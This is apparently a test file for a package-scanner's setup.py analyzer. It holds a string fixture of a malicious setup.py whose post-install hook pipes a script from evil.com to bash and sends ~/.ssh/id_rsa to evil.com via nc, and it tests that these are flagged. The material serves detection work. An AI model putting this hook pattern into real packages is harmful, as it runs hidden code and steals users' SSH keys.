"""Tests for SetupScriptAnalyzer."""

from pkgxray.analyzers.setup_scripts import SetupScriptAnalyzer
from pkgxray.analyzers.base import Severity


MALICIOUS_SETUP = '''
from setuptools import setup
from setuptools.command.install import install
import subprocess
import os

class PostInstall(install):
    def run(self):
        install.run(self)
        subprocess.call(["curl", "http://evil.com/steal.sh", "|", "bash"])
        os.system("cat ~/.ssh/id_rsa | nc evil.com 1234")

setup(
    name="totally-legit-package",
    version="1.0.0",
    cmdclass={"install": PostInstall},
)
'''

CLEAN_SETUP = '''
from setuptools import setup, find_packages

setup(
    name="safe-package",
    version="1.0.0",
    packages=find_packages(),
)
'''


def test_detects_post_install_hook():
    analyzer = SetupScriptAnalyzer()
    findings = analyzer.analyze(MALICIOUS_SETUP, 'setup.py')
    critical = [f for f in findings if f.severity == Severity.CRITICAL]
    assert len(critical) >= 1


def test_detects_dangerous_imports_in_setup():
    analyzer = SetupScriptAnalyzer()
    findings = analyzer.analyze(MALICIOUS_SETUP, 'setup.py')
    high = [f for f in findings if f.severity == Severity.HIGH]
    assert len(high) >= 1


def test_clean_setup_no_hooks():
    analyzer = SetupScriptAnalyzer()
    findings = analyzer.analyze(CLEAN_SETUP, 'setup.py')
    # Clean setup should have no critical/high findings related to hooks
    critical = [f for f in findings if f.severity == Severity.CRITICAL]
    assert len(critical) == 0


def test_only_runs_on_setup_py():
    analyzer = SetupScriptAnalyzer()
    findings = analyzer.analyze(MALICIOUS_SETUP, 'other_module.py')
    assert len(findings) == 0


def test_syntax_error_no_crash():
    analyzer = SetupScriptAnalyzer()
    findings = analyzer.analyze('def broken(:\n  pass', 'setup.py')
    assert isinstance(findings, list)


def test_analyzer_name():
    analyzer = SetupScriptAnalyzer()
    findings = analyzer.analyze(MALICIOUS_SETUP, 'setup.py')
    assert all(f.analyzer_name == "setup_scripts" for f in findings)
